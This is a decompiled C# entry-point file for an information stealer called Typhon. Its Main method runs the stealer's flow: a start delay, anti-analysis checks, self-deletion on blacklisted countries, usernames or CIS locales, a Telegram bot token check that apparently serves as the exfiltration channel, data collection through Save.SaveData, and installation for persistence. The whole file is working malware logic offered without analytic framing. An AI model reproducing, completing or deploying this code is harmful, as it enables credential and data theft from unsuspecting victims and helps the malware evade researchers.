using System;
using Typhon.Modules.Blacklist;
using Typhon.Modules.Implants;
using Typhon.Modules.Miscellaneous;
using Typhon.Stealer;

namespace Typhon
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000004 RID: 4 RVA: 0x0000216C File Offset: 0x0000036C
		private static void Main()
		{
			if (!Config.StartDelay.Contains("###"))
			{
				Delay.StartDelay();
			}
			try
			{
				Networking.EnableSSL();
			}
			catch
			{
			}
			if (Config.AntiAnalysis.Contains("YES"))
			{
				AntiAnalysis.RunAntiAnalysisCheck();
			}
			if (BlacklistedCountries.IsBlacklisted())
			{
				SelfDestruct.MeltSelf();
			}
			if (BlacklistedUsernames.IsBlacklisted())
			{
				SelfDestruct.MeltSelf();
			}
			if (Config.AntiCIS == "1" && AntiCIS.IsCIS())
			{
				SelfDestruct.MeltSelf();
			}
			if (!Networking.IsConnected())
			{
				Environment.Exit(0);
			}
			if (!Telegram.CheckToken())
			{
				SelfDestruct.MeltSelf();
			}
			IOHelper.SetCWD();
			Save.SaveData();
			if (Config.StartupLogs == "1")
			{
				if (!IOHelper.IsInstalled())
				{
					IOHelper.Install();
					SelfDestruct.MeltSelf();
					return;
				}
			}
			else
			{
				SelfDestruct.MeltSelf();
			}
		}
	}
}
